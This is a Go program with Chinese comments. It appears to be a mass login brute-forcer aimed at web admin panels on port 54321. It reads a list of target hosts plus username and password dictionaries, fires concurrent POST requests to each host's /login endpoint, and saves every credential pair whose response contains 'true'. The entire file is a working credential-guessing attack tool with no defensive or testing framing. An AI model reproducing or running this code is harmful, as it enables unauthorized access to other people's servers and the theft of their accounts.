package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	_ "net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	var wg sync.WaitGroup

	// URL 字典文件的路径
	urlDictFile := "urls.txt"

	// 用户名字典文件的路径
	userDictFile := "usernames.txt"

	// 密码字典文件的路径
	passDictFile := "passwords.txt"

	// 结果文件的路径
	resultFile := "results.txt"
	// 打开结果文件
	outputFile, err := os.Create(resultFile)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	defer outputFile.Close()
	// 创建一个 Writer 对象，用于将结果写入文件
	writer := bufio.NewWriter(outputFile)
	defer writer.Flush()
	// 打开 URL 字典文件
	urlFile, err := os.Open(urlDictFile)
	if err != nil {
		fmt.Printf("Error: %v\n", err)
		return
	}
	defer urlFile.Close()

	client := http.Client{
		Timeout: 5 * time.Second,
	}

	// 创建一个 Scanner 对象，用于逐行读取 URL 字典文件
	urlScanner := bufio.NewScanner(urlFile)
	for urlScanner.Scan() {
		// 逐行读取 URL 字典文件，并提取 URL 地址
		sUrl := urlScanner.Text()
		targetURl := "http://" + sUrl + ":54321"
		// 打开用户名字典文件
		userFile, err := os.Open(userDictFile)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			return
		}
		defer userFile.Close()

		// 打开密码字典文件
		passFile, err := os.Open(passDictFile)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			return
		}
		defer passFile.Close()

		// 创建一个 Scanner 对象，用于逐行读取用户名字典文件
		userScanner := bufio.NewScanner(userFile)
		for userScanner.Scan() {
			// 逐行读取用户名字典文件，并提取用户名
			username := userScanner.Text()

			// 创建一个 Scanner 对象，用于逐行读取密码字典文件
			passScanner := bufio.NewScanner(passFile)
			for passScanner.Scan() {
				// 逐行读取密码字典文件，并提取密码
				password := passScanner.Text()

				wg.Add(1)
				go func(targetURl, username, password string) {
					defer wg.Done()

					// 创建一个 POST 请求
					resp, err := client.PostForm(targetURl+"/login", url.Values{
						"username": {username},
						"password": {password},
					})
					if err != nil {
						fmt.Printf("Error: %v\n", err)
						return
					}

					body, err := ioutil.ReadAll(resp.Body) //使用ioutil.readall将resp.body中的数据读取出来,并使用body接受
					if err != nil {
						fmt.Println(err)
					} //处理错误
					fmt.Println(targetURl + "-----" + string(body)) //将body转换成字符串,然后进行打印
					// 将请求结果写入文件
					//fmt.Fprintf(writer, "url: %v username: %v password: %v body: %v\n", targetURl, username, password, string(body))
					if strings.Contains(string(body), "true") {
						writer.WriteString(targetURl + " username:" + username + " password:" + password + " resp:" + string(body) + "\n")
						writer.Flush()
					}
					// 将结果保存到文件
					/*f, err := os.OpenFile("results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
					if err != nil {
						fmt.Println("Failed to open file:", err)
						return
					}
					defer f.Close()
					if _, err := f.WriteString(targetURl + " username:" + username + " password:" + password + " resp:" + string(body) + "\n"); err != nil {
						fmt.Println("Failed to write to file:", err)
						return
					}*/
				}(targetURl, username, password)
			}

			// 重新定位密码字典文件的读取位置，以便下一个用户名可以重新使用它
			passFile.Seek(0, 0)
		}
	}

	wg.Wait()
}
